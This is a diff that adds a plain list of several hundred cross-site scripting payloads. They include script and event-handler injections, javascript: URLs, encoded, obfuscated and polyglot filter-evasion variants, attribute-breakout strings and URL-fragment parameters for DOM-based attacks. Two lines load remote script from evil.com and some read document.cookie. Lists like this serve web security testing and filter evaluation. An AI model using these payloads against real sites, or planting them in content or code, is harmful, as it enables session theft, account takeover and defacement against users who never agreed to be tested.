@@ -1,0 +1,269 @@
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>console.log(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=0 onerror=alert(1)>
+<img src="" onerror=alert(1)>
+<img src=# onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<Img Src=x OnError=alert(1)>
+<iMg sRc=x oNeRrOr=alert(1)>
+<IMG/SRC=x ONERROR=alert(1)>
+<img src=x onerror=%61%6c%65%72%74%28%31%29>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=%2561%256c%2565%2572%2574%2528%2531%2529>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg onload='alert(1)'>
+<svg onload=alert`1`>
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+<svg onload=alert(document.domain)>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&#40;1&#41;</script></svg>
+<SVG ONLOAD=alert(1)>
+<Svg Onload=alert(1)>
+<sVg oNlOaD=alert(1)>
+<svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>
+<svg:svg onload=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+<div onmouseout=alert(1)>hover</div>
+<div onmousedown=alert(1)>click</div>
+<div onmouseup=alert(1)>click</div>
+<div onmousemove=alert(1)>move</div>
+<div onclick=alert(1)>click</div>
+<div ondblclick=alert(1)>dblclick</div>
+<div oncontextmenu=alert(1)>rightclick</div>
+<div onmouseenter=alert(1)>enter</div>
+<div onmouseleave=alert(1)>leave</div>
+<div onwheel=alert(1)>scroll</div>
+<input onkeydown=alert(1)>
+<input onkeyup=alert(1)>
+<input onkeypress=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1)>
+<input onfocus=alert(1)>
+<select onfocus=alert(1) autofocus></select>
+<textarea onfocus=alert(1) autofocus></textarea>
+<a href="#" onfocus=alert(1) autofocus>x</a>
+<input onchange=alert(1)>
+<input oninput=alert(1)>
+<form onsubmit=alert(1)><input type=submit></form>
+<form onreset=alert(1)><input type=reset></form>
+<input oninvalid=alert(1) required type=text>
+<input onsearch=alert(1) type=search>
+<input onselect=alert(1) value=x>
+<body onload=alert(1)>
+<body onunload=alert(1)>
+<body onerror=alert(1)>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<body onhashchange=alert(1)>
+<body onpageshow=alert(1)>
+<body onpagehide=alert(1)>
+<body onbeforeunload=alert(1)>
+<body onfocus=alert(1)>
+<body onblur=alert(1)>
+<video onloadstart=alert(1)><source></video>
+<video onloadeddata=alert(1)><source></video>
+<video onplay=alert(1) autoplay><source></video>
+<video onpause=alert(1)><source></video>
+<video onended=alert(1)><source></video>
+<video onerror=alert(1)><source></video>
+<video oncanplay=alert(1)><source src=x></video>
+<audio onerror=alert(1)><source src=x></audio>
+<audio oncanplay=alert(1) autoplay><source src=x></audio>
+<div draggable=true ondragstart=alert(1)>drag</div>
+<div ondragover=alert(1)>dragover</div>
+<div ondrop=alert(1)>drop</div>
+<div ondragend=alert(1) draggable=true>drag</div>
+<div ondragenter=alert(1)>enter</div>
+<div ondragleave=alert(1)>leave</div>
+<input oncopy=alert(1) value="copy me">
+<input oncut=alert(1) value="cut me">
+<input onpaste=alert(1)>
+<body onafterprint=alert(1)>
+<body onbeforeprint=alert(1)>
+<style>x{animation:x 1s}@keyframes x{}</style><x onanimationstart=alert(1) style="animation:x 1s">
+<div ontransitionend=alert(1) style="transition:all 1s;width:0">x</div>
+<div ontouchstart=alert(1)>touch</div>
+<div ontouchend=alert(1)>touch</div>
+<div ontouchmove=alert(1)>touch</div>
+<div onpointerdown=alert(1)>click</div>
+<div onpointerup=alert(1)>click</div>
+<div onpointermove=alert(1)>move</div>
+<div onpointerover=alert(1)>hover</div>
+<div onpointerenter=alert(1)>enter</div>
+<div onpointerleave=alert(1)>leave</div>
+<div onpointercancel=alert(1)>cancel</div>
+<div ongotpointercapture=alert(1)>x</div>
+<div onlostpointercapture=alert(1)>x</div>
+<details ontoggle=alert(1) open>x</details>
+<marquee onstart=alert(1)>x</marquee>
+<marquee onfinish=alert(1) loop=1>x</marquee>
+<marquee onbounce=alert(1)>x</marquee>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert(document.cookie)">click</a>
+<a href="javascript:confirm(1)">click</a>
+<a href="javascript:prompt(1)">click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="JAVASCRIPT:alert(1)">click</a>
+<a href="javascript&#58;alert(1)">click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+<a href="java&#9;script:alert(1)">click</a>
+<a href="java&#10;script:alert(1)">click</a>
+<a href="java&#13;script:alert(1)">click</a>
+<a href=" javascript:alert(1)">click</a>
+<input type="text" value="x" onfocus=alert(1) autofocus>
+<input type="image" src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input type=hidden onfocus=alert(1) autofocus>
+<input onmouseover=alert(1) value=hover>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe onload=alert(1) src=x></iframe>
+<iframe onload="alert(document.domain)" src=about:blank></iframe>
+<object data="javascript:alert(1)"></object>
+<object onload=alert(1) data=x></object>
+<embed src="javascript:alert(1)">
+<embed src=x onerror=alert(1)>
+<script src=//evil.com/xss.js></script>
+<script src="data:text/javascript,alert(1)"></script>
+<SCRIPT SRC=//evil.com/xss.js></SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+<sCrIpT>alert(1)</sCrIpT>
+<svg OnLoAd=alert(1)>
+<SVG ONLOAD=alert(1)>
+<Svg onLoad=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<iMg OnErRoR=alert(1) src=x>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+%3Csvg+onload%3Dalert%281%29%3E
+%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+<script>alert%281%29</script>
+<img src=x onerror=alert%281%29>
+<svg onload=alert%281%29>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
+&lt;script&gt;alert(1)&lt;/script&gt;
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>\x61\x6c\x65\x72\x74(1)</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',99999)</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>Function('alert(1)')()</script>
+<img	src=x	onerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<img %09 src=x onerror=alert(1)>
+scr\x00ipt>alert(1)</scr\x00ipt>
+<img src=\x00 onerror=alert(1)>
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+<img src=x o<!---->nerror=alert(1)>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onfocus=alert(1) autofocus x="
+" onerror=alert(1) x="
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+">'><script>alert(1)</script>
+</tag><script>alert(1)</script>
+</script><script>alert(1)</script>
+';alert(1);//
+";alert(1);//
+\';alert(1);//
+</script><script>alert(1)</script>
+'-alert(1)-'
+"-alert(1)-"
+`-alert(1)-`
+${alert(1)}
+};alert(1);//
+}}alert(1)//
+<style>@import'javascript:alert(1)'</style>
+<xss style="behavior:url(#default#time2)" onbegin=alert(1)>
+<div style="width:expression(alert(1))">IE only</div>
+<style>*{background:url("javascript:alert(1)")}</style>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></script><script>alert(1)</script>"><img src=x onerror=alert(1)>
+<svg/onload='/*<html/*/onmouseover=alert(1)//>'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr	ipt>alert(1)</scr	ipt>
+<object data="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>console.log(document.cookie)</script>
+<script>throw onerror=alert,1</script>
+<script>onerror=alert;throw 1</script>
+<script>(alert)(1)</script>
+<script>alert?.call(window,1)</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>globalThis.alert(1)</script>
+<script>a=alert,a(1)</script>
+<script>[1].find(alert)</script>
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+<script>{onerror=alert}throw 1</script>
+<img src=x onerror=alert(1) x=>
+<script>alert(1)</script>
+<svg onload=alert(1)>
+#?search=<script>alert(1)</script>
+#?q=<img src=x onerror=alert(1)>
+#?redirect=javascript:alert(1)
+#?url=javascript:alert(document.domain)
+#?name=<svg onload=alert(1)>
+#?callback=alert
+#?next=javascript:alert(1)
+#?returnUrl=javascript:alert(1)
+#?ref=javascript:alert(1)
+#?page=<script>alert(1)</script>
+#?lang=<svg onload=alert(1)>
+#?theme=</style><script>alert(1)</script>
+#?msg=<img src=x onerror=alert(1)>
+<svg o\u006eload=alert(1)>
+<img src=x o\u006eerror=alert(1)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<img src=`x` onerror=alert(1)>
+<img src=' ' onerror=alert(1)>
+<x onmouseover=alert(1)>hover</x>
+<z onclick=alert(1)>click</z>
+<foo onmouseover=alert(1)>hover</foo>
+<a href="jAvAsCrIpT:alert(1)">click</a>
+<a href="javascript&#x3A;alert(1)">click</a>
+<a href="javascript&#58;alert(1)">click</a>
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">click</a>
+
